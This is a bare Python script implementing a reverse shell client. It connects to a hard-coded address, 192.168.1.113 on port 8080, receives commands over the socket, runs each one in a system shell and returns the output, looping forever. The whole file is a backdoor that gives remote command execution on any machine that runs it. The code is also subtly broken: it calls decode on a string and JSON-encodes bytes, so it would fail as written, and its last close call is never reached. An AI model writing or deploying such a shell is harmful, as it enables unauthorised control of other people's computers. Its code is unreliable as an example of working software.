import socket
import subprocess
import json

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))




	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = json.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return json.loads(json_data)
			except ValueError:
				continue



	def start_socket(self):

		while True:

			command = self.json_receive()
			command_output = self.command_execution(command.decode("utf-8"))
			self.json_send(command_output)

		self.my_connection.close()

my_socketo = MySocket("192.168.1.113",8080)
my_socketo.start_socket()

